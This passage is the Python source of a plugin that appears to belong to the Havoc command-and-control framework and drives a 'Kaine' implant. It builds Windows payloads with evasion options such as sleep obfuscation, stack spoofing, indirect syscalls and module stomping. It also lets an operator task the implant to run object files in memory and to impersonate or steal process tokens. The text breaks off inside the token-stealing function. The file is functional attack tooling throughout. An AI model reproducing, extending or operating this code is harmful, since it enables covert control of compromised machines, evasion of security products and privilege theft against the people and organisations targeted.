import pyhavoc

import PySide6
from PySide6.QtCore import *
from PySide6.QtGui import *
from PySide6.QtWidgets import *

import time
import base64
import argparse
import shlex

from os.path import exists
from struct import pack, unpack, calcsize

KAINE_COMMANDS: list = []

@pyhavoc.ui.HcUiBuilderRegisterView( "Kaine" )
class HcKaineBuilder( pyhavoc.ui.HcPayloadView ):

    def __init__( self, *args, **kwargs ):
        super().__init__( *args, **kwargs )

    ##
    ## main function to be executed
    ## should create the widgets inputs
    ## for the payload builder
    ##
    def main( self, widget: PySide6.QtWidgets.QWidget ):

        self.gridLayout = QGridLayout( widget )
        self.gridLayout.setObjectName(u"gridLayout")
        self.gridLayout.setContentsMargins( 0, 0, 0, 0 )

        self.ScrollAreaStack = QScrollArea( widget )
        self.ScrollAreaStack.setObjectName(u"ScrollAreaStack")
        self.ScrollAreaStack.setWidgetResizable(True)

        self.ScrollAreaWidget = QWidget()
        self.ScrollAreaWidget.setObjectName(u"ScrollAreaWidget")
        self.ScrollAreaWidget.setProperty( "HcWidgetDark", "true" )

        self.gridLayout_5 = QGridLayout(self.ScrollAreaWidget)
        self.gridLayout_5.setObjectName(u"gridLayout_5")

        self.GridLayoutHeader = QGridLayout()
        self.GridLayoutHeader.setObjectName(u"GridLayoutHeader")
        self.GridLayoutHeader.setSizeConstraint(QLayout.SetDefaultConstraint)

        self.ComboListener = QComboBox(self.ScrollAreaWidget)
        self.ComboListener.setObjectName(u"ComboListener")

        self.GridLayoutHeader.addWidget(self.ComboListener, 0, 1, 1, 1)

        self.LabelArch = QLabel(self.ScrollAreaWidget)
        self.LabelArch.setObjectName(u"LabelArch")

        self.GridLayoutHeader.addWidget(self.LabelArch, 1, 0, 1, 1)

        self.ComboArch = QComboBox(self.ScrollAreaWidget)
        self.ComboArch.setObjectName(u"ComboArch")

        self.GridLayoutHeader.addWidget(self.ComboArch, 1, 1, 1, 1)

        self.LabelListener = QLabel(self.ScrollAreaWidget)
        self.LabelListener.setObjectName(u"LabelListener")

        self.GridLayoutHeader.addWidget(self.LabelListener, 0, 0, 1, 1)

        self.LabelFormat = QLabel(self.ScrollAreaWidget)
        self.LabelFormat.setObjectName(u"LabelFormat")

        self.GridLayoutHeader.addWidget(self.LabelFormat, 2, 0, 1, 1)

        self.ComboFormat = QComboBox(self.ScrollAreaWidget)
        self.ComboFormat.setObjectName(u"ComboFormat")

        self.GridLayoutHeader.addWidget(self.ComboFormat, 2, 1, 1, 1)

        self.GridLayoutHeader.setColumnStretch(1, 1)

        self.gridLayout_5.addLayout(self.GridLayoutHeader, 0, 0, 1, 2)

        self.GroupCoreSettings = QGroupBox(self.ScrollAreaWidget)
        self.GroupCoreSettings.setObjectName(u"GroupCoreSettings")
        self.gridLayout_3 = QGridLayout(self.GroupCoreSettings)
        self.gridLayout_3.setObjectName(u"gridLayout_3")
        self.LabelKillDate = QLabel(self.GroupCoreSettings)
        self.LabelKillDate.setObjectName(u"LabelKillDate")

        self.gridLayout_3.addWidget(self.LabelKillDate, 0, 0, 1, 1)

        self.LabelStackSpoofing = QLabel(self.GroupCoreSettings)
        self.LabelStackSpoofing.setObjectName(u"LabelStackSpoofing")

        self.gridLayout_3.addWidget(self.LabelStackSpoofing, 3, 0, 1, 1)

        self.GroupSleepObf = QGroupBox(self.GroupCoreSettings)
        self.GroupSleepObf.setObjectName(u"GroupSleepObf")
        self.gridLayout_7 = QGridLayout(self.GroupSleepObf)
        self.gridLayout_7.setObjectName(u"gridLayout_7")
        self.GridLayoutSleepObf = QGridLayout()
        self.GridLayoutSleepObf.setObjectName(u"GridLayoutSleepObf")
        self.LabelSleepObfJmpGadget = QLabel(self.GroupSleepObf)
        self.LabelSleepObfJmpGadget.setObjectName(u"LabelSleepObfJmpGadget")

        self.GridLayoutSleepObf.addWidget(self.LabelSleepObfJmpGadget, 1, 0, 1, 1)

        self.LabelEncryption = QLabel(self.GroupSleepObf)
        self.LabelEncryption.setObjectName(u"LabelEncryption")

        self.GridLayoutSleepObf.addWidget(self.LabelEncryption, 2, 0, 1, 1)

        self.LabelSleepObfTechnique = QLabel(self.GroupSleepObf)
        self.LabelSleepObfTechnique.setObjectName(u"LabelSleepObfTechnique")

        self.GridLayoutSleepObf.addWidget(self.LabelSleepObfTechnique, 0, 0, 1, 1)

        self.CheckHeapEncryption = QCheckBox(self.GroupSleepObf)
        self.CheckHeapEncryption.setObjectName(u"CheckHeapEncryption")

        self.GridLayoutSleepObf.addWidget(self.CheckHeapEncryption, 4, 0, 1, 3)

        self.CheckStackDuplication = QCheckBox(self.GroupSleepObf)
        self.CheckStackDuplication.setObjectName(u"CheckStackDuplication")

        self.GridLayoutSleepObf.addWidget(self.CheckStackDuplication, 3, 0, 1, 3)

        self.ComboEncryption = QComboBox(self.GroupSleepObf)
        self.ComboEncryption.setObjectName(u"ComboEncryption")

        self.GridLayoutSleepObf.addWidget(self.ComboEncryption, 2, 1, 1, 2)

        self.ComboSleepObfJmpGadget = QComboBox(self.GroupSleepObf)
        self.ComboSleepObfJmpGadget.setObjectName(u"ComboSleepObfJmpGadget")

        self.GridLayoutSleepObf.addWidget(self.ComboSleepObfJmpGadget, 1, 1, 1, 2)

        self.ComboSleepObfTechnique = QComboBox(self.GroupSleepObf)
        self.ComboSleepObfTechnique.setObjectName(u"ComboSleepObfTechnique")

        self.GridLayoutSleepObf.addWidget(self.ComboSleepObfTechnique, 0, 1, 1, 2)

        self.GridLayoutSleepObf.setColumnStretch(1, 1)

        self.gridLayout_7.addLayout(self.GridLayoutSleepObf, 0, 0, 1, 1)

        self.VSpacerSleepObf = QSpacerItem(0, 3, QSizePolicy.Minimum, QSizePolicy.Expanding)

        self.gridLayout_7.addItem(self.VSpacerSleepObf, 1, 0, 1, 1)


        self.gridLayout_3.addWidget(self.GroupSleepObf, 9, 0, 1, 3)

        self.InputModuleStomp = QLineEdit(self.GroupCoreSettings)
        self.InputModuleStomp.setObjectName(u"InputModuleStomp")

        self.gridLayout_3.addWidget(self.InputModuleStomp, 6, 1, 1, 2)

        self.InputSleep = QLineEdit(self.GroupCoreSettings)
        self.InputSleep.setObjectName(u"InputSleep")
        self.InputSleep.setValidator( QIntValidator() )

        self.gridLayout_3.addWidget(self.InputSleep, 1, 1, 1, 2)

        self.CheckKillDate = QCheckBox(self.GroupCoreSettings)
        self.CheckKillDate.setObjectName(u"CheckKillDate")

        self.gridLayout_3.addWidget(self.CheckKillDate, 0, 2, 1, 1)

        self.LabelAntiShellcode = QLabel(self.GroupCoreSettings)
        self.LabelAntiShellcode.setObjectName(u"LabelAntiShellcode")

        self.gridLayout_3.addWidget(self.LabelAntiShellcode, 4, 0, 1, 1)

        self.ComboAntiShellcode = QComboBox(self.GroupCoreSettings)
        self.ComboAntiShellcode.setObjectName(u"ComboAntiShellcode")

        self.gridLayout_3.addWidget(self.ComboAntiShellcode, 4, 1, 1, 2)

        self.LabelModuleLoad = QLabel(self.GroupCoreSettings)
        self.LabelModuleLoad.setObjectName(u"LabelModuleLoad")

        self.gridLayout_3.addWidget(self.LabelModuleLoad, 5, 0, 1, 1)

        self.InputJitter = QLineEdit(self.GroupCoreSettings)
        self.InputJitter.setObjectName(u"InputJitter")
        self.InputJitter.setValidator( QIntValidator( 0, 100 ) )

        self.gridLayout_3.addWidget(self.InputJitter, 2, 1, 1, 2)

        self.CheckModuleRndOrder = QCheckBox(self.GroupCoreSettings)
        self.CheckModuleRndOrder.setObjectName(u"CheckModuleRndOrder")

        self.gridLayout_3.addWidget(self.CheckModuleRndOrder, 8, 0, 1, 3)

        self.LabelModuleStomp = QLabel(self.GroupCoreSettings)
        self.LabelModuleStomp.setObjectName(u"LabelModuleStomp")

        self.gridLayout_3.addWidget(self.LabelModuleStomp, 6, 0, 1, 1)

        self.DateTimeKillDate = QDateTimeEdit( self.GroupCoreSettings )
        self.DateTimeKillDate.setObjectName( u"DateTimeKillDate" )
        self.DateTimeKillDate.setTimeSpec( PySide6.QtCore.Qt.TimeSpec.LocalTime )
        self.DateTimeKillDate.setCalendarPopup( True )
        self.DateTimeKillDate.setDateTime( PySide6.QtCore.QDateTime.currentDateTime() )
        self.DateTimeKillDate.setDisplayFormat("dd-MMM-yyyy hh:mm:00")

        self.gridLayout_3.addWidget(self.DateTimeKillDate, 0, 1, 1, 1)

        self.LabelSleep = QLabel(self.GroupCoreSettings)
        self.LabelSleep.setObjectName(u"LabelSleep")

        self.gridLayout_3.addWidget(self.LabelSleep, 1, 0, 1, 1)

        self.ComboStackSpoofing = QComboBox(self.GroupCoreSettings)
        self.ComboStackSpoofing.setObjectName(u"ComboStackSpoofing")

        self.gridLayout_3.addWidget(self.ComboStackSpoofing, 3, 1, 1, 2)

        self.ComboModuleLoad = QComboBox(self.GroupCoreSettings)
        self.ComboModuleLoad.setObjectName(u"ComboModuleLoad")

        self.gridLayout_3.addWidget(self.ComboModuleLoad, 5, 1, 1, 2)

        self.LabelJitter = QLabel(self.GroupCoreSettings)
        self.LabelJitter.setObjectName(u"LabelJitter")

        self.gridLayout_3.addWidget(self.LabelJitter, 2, 0, 1, 1)

        self.CheckIndirectSyscall = QCheckBox(self.GroupCoreSettings)
        self.CheckIndirectSyscall.setObjectName(u"CheckIndirectSyscall")

        self.gridLayout_3.addWidget(self.CheckIndirectSyscall, 7, 0, 1, 1)

        self.InputIndirectSyscall = QLineEdit(self.GroupCoreSettings)
        self.InputIndirectSyscall.setObjectName(u"InputIndirectSyscall")

        self.gridLayout_3.addWidget(self.InputIndirectSyscall, 7, 1, 1, 2)

        self.gridLayout_5.addWidget(self.GroupCoreSettings, 1, 0, 1, 2)

        self.GroupExecuteable = QGroupBox(self.ScrollAreaWidget)
        self.GroupExecuteable.setObjectName(u"GroupExecuteable")

        self.gridLayout_5.addWidget(self.GroupExecuteable, 0, 2, 2, 2)

        self.ScrollAreaStack.setWidget(self.ScrollAreaWidget)

        self.gridLayout.addWidget(self.ScrollAreaStack, 0, 0, 1, 1)

        self.LabelArch.setText(QCoreApplication.translate("KaineBuilder", u"Arch: ", None))
        self.LabelListener.setText(QCoreApplication.translate("KaineBuilder", u"Listener: ", None))
        self.LabelFormat.setText(QCoreApplication.translate("KaineBuilder", u"Format: ", None))
        self.GroupCoreSettings.setTitle(QCoreApplication.translate("KaineBuilder", u"Core Settings", None))
        self.LabelKillDate.setText(QCoreApplication.translate("KaineBuilder", u"Kill Date: ", None))
        self.LabelStackSpoofing.setText(QCoreApplication.translate("KaineBuilder", u"Stack Spoofing: ", None))
        self.GroupSleepObf.setTitle(QCoreApplication.translate("KaineBuilder", u"Sleep Obfuscation", None))
        self.LabelSleepObfJmpGadget.setText(QCoreApplication.translate("KaineBuilder", u"Jmp Gadget: ", None))
        self.LabelEncryption.setText(QCoreApplication.translate("KaineBuilder", u"Encryption:", None))
        self.LabelSleepObfTechnique.setText(QCoreApplication.translate("KaineBuilder", u"Technique: ", None))
        self.CheckHeapEncryption.setText(QCoreApplication.translate("KaineBuilder", u"Heap Encryption", None))
        self.CheckStackDuplication.setText(QCoreApplication.translate("KaineBuilder", u"Stack Duplication", None))
        self.CheckKillDate.setText(QCoreApplication.translate("KaineBuilder", u"Enable Killdate", None))
        self.LabelAntiShellcode.setText(QCoreApplication.translate("KaineBuilder", u"Anti-Shellcode mitigation: ", None))
        self.LabelModuleLoad.setText(QCoreApplication.translate("KaineBuilder", u"Module load technique: ", None))
        self.CheckModuleRndOrder.setText(QCoreApplication.translate("KaineBuilder", u"Module random load order", None))
        self.LabelModuleStomp.setText(QCoreApplication.translate("KaineBuilder", u"Module Stomp (Plugin): ", None))
        self.LabelSleep.setText(QCoreApplication.translate("KaineBuilder", u"Sleep: ", None))
        self.LabelJitter.setText(QCoreApplication.translate("KaineBuilder", u"Jitter (%): ", None))
        self.CheckIndirectSyscall.setText(QCoreApplication.translate("KaineBuilder", u"Indirect Syscall", None))
        self.GroupExecuteable.setTitle(QCoreApplication.translate("KaineBuilder", u"Executable:", None))

        QMetaObject.connectSlotsByName( widget )

        self.set_defaults()

        return

    ##
    ## refresh the widget based on following things:
    ##  - new listener started
    ##  - new script loaded
    ##  - new agent connected
    ##
    def refresh( self ) -> None:
        self.set_defaults()

    def set_defaults(self) -> None:

        self.ComboListener.clear()
        listeners = pyhavoc.core.HcListenerAll()
        if len( listeners ) == 0:
            self.ComboListener.addItem( "(no listener available)" )
            self.ComboListener.setEnabled( False )
        else:
            for i in listeners:
                self.ComboListener.addItem( i )

        self.ComboArch.clear()
        self.ComboArch.addItem( "x64" )
        self.ComboArch.addItem( "x86" )

        self.ComboFormat.clear()
        self.ComboFormat.addItem( "Windows Exe" )
        self.ComboFormat.addItem( "Windows Dll" )
        self.ComboFormat.addItem( "Windows Service Exe" )
        self.ComboFormat.addItem( "Windows Shellcode" )
        self.ComboFormat.addItem( "Windows VBS" )
        self.ComboFormat.addItem( "Windows PS1" )

        self.InputSleep.setText( "5" )
        self.InputJitter.setText( "10" )

        self.ComboStackSpoofing.clear()
        self.ComboStackSpoofing.addItem( "None" )
        self.ComboStackSpoofing.addItem( "Synthetic Frames" )

        self.ComboAntiShellcode.clear()
        self.ComboAntiShellcode.addItem( "None" )
        self.ComboAntiShellcode.addItem( "mov rax, [rax]" )

        self.ComboModuleLoad.clear()
        self.ComboModuleLoad.addItem( "LdrLoadDll" )
        self.ComboModuleLoad.addItem( "RtlRegisterWait( LoadLibraryW )" )
        self.ComboModuleLoad.addItem( "RtlCreateTimer( LoadLibraryW )" )
        self.ComboModuleLoad.addItem( "RtlQueueWorkItem( LoadLibraryW )" )
        self.ComboModuleLoad.addItem( "TpAllocWork( LoadLibraryW )" )
        self.ComboModuleLoad.addItem( "NtMapViewOfSection" )
        self.ComboModuleLoad.addItem( "NtAllocateVirtualMemory" )

        self.InputIndirectSyscall.setText( "NtAddBootEntry" )

        self.ComboSleepObfTechnique.clear()
        self.ComboSleepObfTechnique.addItem( "Ekko" )
        self.ComboSleepObfTechnique.addItem( "Zilean" )
        self.ComboSleepObfTechnique.addItem( "Foliage" )

        self.ComboSleepObfJmpGadget.clear()
        self.ComboSleepObfJmpGadget.addItem( "None" )
        self.ComboSleepObfJmpGadget.addItem( "jmp rax" )
        self.ComboSleepObfJmpGadget.addItem( "jmp rbx" )

        self.ComboEncryption.clear()
        self.ComboEncryption.addItem( "SystemFunction032 (RC4)" )
        self.ComboEncryption.addItem( "SystemFunction040 (3DES)" )

        return

    ##
    ## sanity check the given input
    ## return:
    ##  true  -> successful checked the input and nothing is wrong
    ##  false -> failed to check and something went wrong
    ##
    def sanity_check( self ) -> bool:
        return True

    ##
    ## pressing "Generate" action or
    ## while saving a profile
    ##
    def generate( self ) -> dict:

        config: dict = {
            "Listener": self.ComboListener.currentText(),
            "Arch"    : self.ComboArch.currentText(),
            "Format"  : self.ComboFormat.currentText(),

            "Core": {
                "Sleep"  : self.InputSleep.text(),
                "Jitter" : self.InputJitter.text(),
            }
        }

        if self.CheckKillDate.isChecked() :
            config[ "Core" ][ "Kill Date" ] = self.DateTimeKillDate.dateTime()

        return config

    ##
    ## pressing "Save Profile" action
    ##
    def profile_save( self ) -> dict:
        pass

    ##
    ## pressing "Load Profile" action
    ##
    def profile_load( self, profile: dict ) -> bool:
        pass

    ##
    ## payload has been generated
    ##
    def payload( self, payload: bytes ) -> None:
        pass

class HcKaineCommand:
    pass

class KnPacker:
    def __init__(self):
        self.buffer : bytes = b''
        self.size   : int   = 0

    def build( self ):
        return pack("<L", self.size) + self.buffer

    def add_string(self, s):
        if s is None:
            s = ''
        if isinstance(s, str):
            s = s.encode("utf-8" )
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s)+1, s)
        self.size   += calcsize(fmt)

    def add_wide_string(self, s):
        if s is None:
            s = ''
        s = s.encode("utf-16_le")
        fmt = "<L{}s".format(len(s) + 2)
        self.buffer += pack(fmt, len(s)+2, s)
        self.size   += calcsize(fmt)

    def add_bytes(self, b):
        if b is None:
            b = b''
        fmt = "<L{}s".format(len(b))
        self.buffer += pack(fmt, len(b), b)
        self.size   += calcsize(fmt)

    def add_u8(self, b):
        fmt = '<c'
        self.buffer += pack(fmt, b)
        self.size   += 1

    def add_u32(self, dint):
        self.buffer += pack("<i", dint)
        self.size   += 4

    def add_u16(self, n):
        fmt = '<h'
        self.buffer += pack(fmt, n)
        self.size   += 2

@pyhavoc.agent.HcAgentExport
class KnParser:

    def __init__(
        self,
        buffer: bytes
    ):
        self.buffer: bytes = buffer

        return

    def length( self ) -> int:
        return len( self.buffer )

    def parse_int( self ) -> int:
        if self.length() < 4:
            return 0

        val = unpack( "<I", self.buffer[ :4 ] )
        self.buffer = self.buffer[ 4: ]

        return val[ 0 ]

    def parse_bytes( self ) -> bytes:
        length      = self.parse_int()
        buf         = self.buffer[ :length ]
        self.buffer = self.buffer[ length: ]

        return buf

    def parse_pad( self, length: int ) -> bytes:
        if self.length() < length:
            return b''

        buf         = self.buffer[ :length ]
        self.buffer = self.buffer[ length: ]

        return buf

    def parse_str( self ) -> str:
        return self.parse_bytes().decode( 'utf-8' )


@pyhavoc.agent.HcAgentExport
class KnObjectModule:

    def __init__(
        self,
        agent,
        object     : any,
        function   : str   = "",
        *args,
        data       : bytes = b'',
        obfuscate  : bool  = False,
        veh_dbg    : bool  = False,
        object_uuid: int   = 0,
        pass_return: bool  = False
    ):
        self.__agent    = agent
        self.__object   = object
        self.__handle   = 0
        self.__status   = ""
        self.__error    = ""
        self.__return   = ""
        self.__uuid     = 0
        self.__obj_uuid = object_uuid

        buffer = b''
        packer = KnPacker()

        ##
        ## check if the object parameter is an
        ## byte array to be loaded by the agent
        ##
        if type( object ) == bytes:

            if len(args) > 0:
                for i in args:
                    if type( i ) == int:
                        packer.add_u32( i )
                    elif type( i ) == str:
                        packer.add_string( i )
                    elif type( i ) == bytes:
                        packer.add_bytes( i )

                buffer = packer.build()

            if len(data) > 0:
                buffer = data

            ##
            ## task the kaine agent to
            ## load the object file into memory
            ##
            ctx = self.__agent.object_execute(
                self.__object,
                entry=function,
                parameters=buffer,
                is_module=True,
                wait_to_finish=True,
                object_uuid=object_uuid,
                pass_return=pass_return
            )

            self.__status = ctx[ 'status' ]
            self.__uuid   = ctx[ 'task-uuid' ]

            if ctx[ 'status' ] == "STATUS_SUCCESS":
                self.__handle = ctx[ 'handle' ]
                self.__return = ctx[ 'return' ].decode( 'utf-8' )
            else:
                self.__error = ctx[ 'return' ].decode( 'utf-8' )

        else:
            self.__handle = object
            self.__status = 'STATUS_SUCCESS'

        return

    def uuid( self ) -> int:
        return self.__uuid

    def object_uuid( self ) -> int:
        return self.__obj_uuid

    def handle( self ) -> int:
        return self.__handle

    def error( self ) -> str:
        return self.__error

    def data( self ) -> str:
        return self.__return

    def status( self ) -> str:
        return self.__status

    def invoke(
        self,
        function,
        *args,
        data       : bytes = b'',
        object_uuid: int   = 0,
        pass_return: bool  = True
    ) -> dict:

        packer = KnPacker()
        buffer: bytes    = b''

        if self.status() != 'STATUS_SUCCESS':
            return {
                "error": self.error()
            }

        if len(args) > 0:

            for i in args:
                if type( i ) == int:
                    packer.add_u32( i )
                elif type( i ) == str:
                    packer.add_string( i )
                elif type( i ) == bytes:
                    packer.add_bytes( i )

            buffer = packer.build()

        if len(data) > 0:
            buffer = data

        ctx = self.__agent.object_execute(
            object=self.handle(),
            parameters=buffer,
            entry=function,
            wait_to_finish=True,
            object_uuid=object_uuid,
            pass_return=pass_return
        )

        self.__status = ctx[ 'status' ]
        self.__uuid   = ctx[ 'task-uuid' ]

        if ctx[ 'status' ] == "STATUS_SUCCESS":
            self.__return = ctx[ 'return' ]
        else:
            self.__error = ctx[ 'return' ].decode( 'utf-8' )

        return ctx

    def free( self ):

        ctx = self.__agent.object_free( self.handle(), wait_to_finish=True )

        self.__status = ctx[ 'status' ]
        self.__uuid   = ctx[ 'task-uuid' ]

        if self.__status != "STATUS_SUCCESS":
            self.__error = ctx[ 'return' ].decode( 'utf-8' )

        return

class HcTableDict( dict ):

    def __init__( self, kaine_agent ):
        super( HcTableDict, self ).__init__()
        self.kaine = kaine_agent

    def __setitem__(self, key, item):
        self.kaine.key_set( key, item )

    def __getitem__(self, key):
        return self.kaine.key_get( key )

    def __delitem__(self, key):
        self.kaine.key_delete( key )

    def has_key(self, key):
        return self.kaine.key_exist( key )

    def __contains__(self, item):
        return self.kaine.key_exist( item )


@pyhavoc.agent.HcAgentRegisterInterface( "Kaine" )
class HcKaine( pyhavoc.agent.HcAgent ):

    def __init__( self, *args, **kwargs ):
        super().__init__( *args, **kwargs )

        self.key_store = HcTableDict( self )

        return

    def console_error( self, text ):
        self.console_print( "%x[%D %T]%$ %r[-]%$ " + text )
        return

    def console_log( self, text, type="info" ):
        self.agent_execute( {
            "command": "KnConsole",
            "arguments": {
                "type"   : type,
                "output" : text
            }
        }, True )

        return

    def console_input( self, text, local_only=False ):
        if local_only is True:
            self.console_print( "" )
            self.console_print( "%x[%D %T]%$ %pKaine%$ %c>>>%$ " + text )
        else:
            self.agent_execute( {
                "command": "KnConsole",
                "arguments": {
                    "type"   : "input",
                    "output" : text
                }
            }, True )

        return

    def input_dispatch( self, input: str ):
        ##
        ## setup available commands
        ##
        commands       = shlex.split( input )
        kaine_commands = []

        if len( commands ) == 0:
            return

        for KnTaskObject in KAINE_COMMANDS:
            kaine_commands.append( KnTaskObject( self ) )

        if commands[ 0 ].lower() == "help":
            largest_name_length = 0

            self.console_print( "" )
            self.console_print( "%x[%D %T]%$ %pKaine%$ %c>>>%$ " + input )
            self.console_print( "" )
            self.console_print( " Kaine Commands" )
            self.console_print( " ==============" )
            self.console_print( "" )

            ##
            ## find the largest command name
            ##
            for i in kaine_commands:
                if len(i.command) >= largest_name_length:
                    largest_name_length = len(i.command)

            self.console_print( f"   Command{' ' * (largest_name_length - 7)}   Description" )
            self.console_print( f"   -------{' ' * (largest_name_length - 7)}   -----------" )

            for i in kaine_commands:
                self.console_print( f"   {i.command + ' ' * (largest_name_length - len(i.command))}   {i.description}" )

            self.console_print( "" )
        else:
            found = False

            for i in kaine_commands:
                if commands[ 0 ] == i.command:

                    parsed_args = i._args_handle( commands )
                    if parsed_args is not None:

                        if i.min_args <= ( len( commands ) - 1 ):
                            self.console_input( input )
                            i.execute( parsed_args )
                        else:
                            usage = i.parser.format_usage()
                            self.console_input( input, local_only=True )
                            self.console_print( usage[ :len( usage ) - 1 ] )

                    found = True

            if found is False:
                self.console_input( input, local_only=True )
                self.console_error( f"invalid command: {input}" )

        return

    def key_get( self, key: str ) -> any:
        return self.agent_execute( {
            "command"   : "KnStoreGet",
            "arguments" : {
                "key": key
            },
        }, True )[ 'result' ]

    def key_set( self, key: str, val: any ) -> any:
        self.agent_execute( {
            "command"   : "KnStoreSet",
            "arguments" : {
                "key"   : key,
                "value" : val
            },
        }, True )

    def key_exist( self, key: str ) -> bool:
        return self.agent_execute( {
            "command"   : "KnStoreExist",
            "arguments" : {
                "key"   : key,
            },
        }, True )[ 'result' ]

    def key_delete( self, key: str ) -> None:
        self.agent_execute( {
            "command"   : "KnStoreDelete",
            "arguments" : {
                "key"   : key,
            },
        }, True )

    def task_generate(
        self,
    ) -> int:
        ##
        ## try to generate task uuid
        ##
        resp = self.agent_execute( {
            "command": "KnTaskGenerate",
        }, True )

        return resp[ 'task-uuid' ]

    def task_read(
        self,
        task_uuid: int
    ) -> bytes:

        ##
        ## try to generate task uuid
        ##
        resp = self.agent_execute( {
            "command": "KnTaskRead",
            "arguments": {
                "task-uuid": task_uuid
            }
        }, True )

        return base64.b64decode( resp[ 'read' ] )

    def task_exist(
        self,
        task_uuid: int
    ) -> bool:
        ##
        ## try to generate task uuid
        ##
        resp = self.agent_execute( {
            "command": "KnTaskExist",
            "arguments": {
                "task-uuid": task_uuid
            }
        }, True )

        return resp[ 'exist' ]

    def task_delete(
        self,
        task_uuid: int
    ) -> bytes:

        ##
        ## try to generate task uuid
        ##
        resp = self.agent_execute( {
            "command": "KnTaskDelete",
            "arguments": {
                "task-uuid": task_uuid
            }
        }, True )

        return resp[ 'success' ]

    def object_module(
        self,
        object     : any,
        function   : str   = "",
        *args,
        data       : bytes = b'',
        obfuscate  : bool  = False,
        veh_dbg    : bool  = False,
        object_uuid: int   = 0,
        pass_return: bool  = False
    ) -> KnObjectModule:

        return KnObjectModule(
            agent=self,
            object=object,
            function=function,
            *args,
            data=data,
            obfuscate=obfuscate,
            veh_dbg=veh_dbg,
            object_uuid=object_uuid,
            pass_return=pass_return
        )

    def object_free(
        self,
        handle         : int,
        wait_to_finish : bool = False,
        task_uuid      : int  = 0,
    ) -> dict:
        return self.agent_execute( {
            "command":   "IoObjectControl",
            "arguments": {
                "object"   : handle,
                "free"     : True,
                "task-uuid": task_uuid
            }
        }, wait_to_finish )

    def object_execute(
        self,
        object        : any,
        entry         : str   = "go",
        parameters    : any   = b'',
        is_module     : bool  = False,
        base_address  : int   = 0,
        wait_to_finish: bool  = False,
        object_uuid   : int   = 0,
        task_uuid     : int   = 0,
        pass_return   : bool  = False
    ) -> dict:
        """
        execute an object file in memory

        :param object:
            object file bytes to load and execute in memory
            or object file handle that already has been loaded
            into memory

        :param entry:
             entry point function name to execute after
             loading the object file into memory

        :param parameters:
            arguments to pass to the entry point function

        :param is_module:
            if this argument is set to true then the object file
            won't be released from memory and is going to return
            the handle/address of the object file for further
            function invocation.
            be aware that if this flag is specified it is going
            to block the current execution and wait til the file
            has been loaded into memory to return the handle.

        :param base_address:
            base address of where to write the object file to.
            can be ann address from a stomped module or virtual
            private memory.

        :param wait_to_finish:
            wait til the execution of the bof finished

        :param object_uuid
            object uuid that is going to be passed to the object file function

        :param task_uuid
            tasking id to use for the execution of the object file

        :param pass_return
            pass return buffer to the invoked function name

            by default the entry point is going to have this proto-type

            ```c
            VOID Function( PVOID Argv, ULONG Argc, ULONG PacketUuid, KnSelf )
            ```

            after enabling pass_return it is going to change the proto-type to

            ```c
            VOID Function( PVOID Argv, ULONG Argc, PBUFFER Buffer )
            ```

        :return:
            status of executing the object file
        """

        wait: bool = wait_to_finish
        resp: dict = {}
        obj : any  = None

        ##
        ## we have to wait til we receive back the
        ## handle of the object file in memory
        ##
        if is_module:
           wait = True

        if type( object ) == bytes:
            obj = base64.b64encode( object ).decode( 'utf-8' )
        elif type( object ) == int:
            obj = object
        else:
            return {
                "status": -1,
                "return": "object is not a byte array or handle"
            }

        ##
        ## task the agent to invoke an object file
        ##
        resp = self.agent_execute( {
                "command":   "IoObjectControl",
                "arguments": {
                    "object"      : obj,
                    "entry"       : entry,
                    "args"        : base64.b64encode( parameters ).decode( 'utf-8' ),
                    "module"      : is_module,
                    "address"     : base_address,
                    "object-uuid" : object_uuid,
                    "task-uuid"   : task_uuid,
                    "pass-return" : pass_return,
                }
            },
            wait
        )

        ##
        ## if there is something to parse then
        ## lets parse it and return it
        ##
        if wait_to_finish is True:
            if "return" in resp:
                resp[ "return" ] = base64.b64decode( resp[ "return" ].encode( 'utf-8' ) )

        return resp

    def token_uid(
        self,
        token_handle  : int  = 0,
        wait_to_finish: bool = True
    ) -> tuple[str, bool, int]:
        """
        get the token uid name and elevation status

        :param token_handle:
            token to get uid from and its elevation status

        :param wait_to_finish:
            should wait for returned data (default: true)

        :return:
            returning a tuple -> (uid, elevated, task-uuid)

            uid:
                the uid string (utf-16le) that has been
                retrieved from the specified or current token

            elevated:
                elevation status of the current or specified token

            task-uuid
                uuid of task
        """

        ctx = self.agent_execute( {
            "command":   "IoTokenControl",
            "arguments": {
                "control"     : "uid",
                "token-handle": token_handle
            }
        }, wait_to_finish )

        if 'error' in ctx:
            raise Exception( ctx[ 'error' ] )

        if 'status' in ctx:
            if ctx[ 'status' ] != 'STATUS_SUCCESS':
                raise Exception( ctx[ 'status' ] )

        task = ctx[ 'task-uuid' ]
        ctx  = ctx[ 'return' ]

        return ctx[ 'uid' ], ctx[ 'is_admin' ], task

    def token_revert(
        self,
        wait_to_finish: bool = True
    ) -> tuple[bool, int]:
        """
        revert current impersonated thread token to itself

        :param wait_to_finish:
            should wait for returned data (default: true)
             
        :return: 
            returning a tuple -> (reverted, task-uuid)
            
            reverted: 
                status if the thread token has been reverted to itself

            task-uuid:
                uuid of task
        """
        
        ctx = self.agent_execute( {
            "command":   "IoTokenControl",
            "arguments": {
                "control": "revert",
            }
        }, wait_to_finish )

        if 'error' in ctx:
            raise Exception( ctx[ 'error' ] )

        if 'status' in ctx:
            if ctx[ 'status' ] != 'STATUS_SUCCESS':
                raise Exception( ctx[ 'status' ] )

        return True, ctx[ 'task-uuid' ]

    def token_impersonate(
        self,
        token_handle: int,
        wait_to_finish: bool = True
    ) -> tuple[str, int]:
        """
        impersonate given token

        :param token_handle:
            token to impersonate

        :param wait_to_finish:
            should wait for returned data (default: true)

        :return:
            returning a tuple -> (uid, task-uuid)

            uid:
                username of the impersonated token

            task-uuid:
                uuid of task
        """

        ctx = self.agent_execute( {
            "command":   "IoTokenControl",
            "arguments": {
                "control":      "impersonate",
                "token-handle": token_handle
            }
        }, wait_to_finish )

        if 'error' in ctx:
            raise Exception( ctx[ 'error' ] )

        if 'status' in ctx:
            if ctx[ 'status' ] != 'STATUS_SUCCESS':
                raise Exception( ctx[ 'status' ] )

        return ctx[ 'return' ], ctx[ 'task-uuid' ]

    def token_steal(
        self,
        process_id    : int,
        impersonate   : bool = True,
        vault_save    : bool = True,
        wait_to_finish: bool = True
    ) -> tuple[int, str, int]:
        """
        process token stealing function

        :param process_id:
            process id to steal token from

        :param impersonate
            if the stolen token should be impersonated

        :param vault_save:
            if the stolen token should be saved to the vault (default: true)

        :param wait_to_finish:
            should wait for returned data (default: true)

        :return:
            returning a tuple -> (token-handle, uid, task-uuid)

            token-handle:
                process token handle that has been
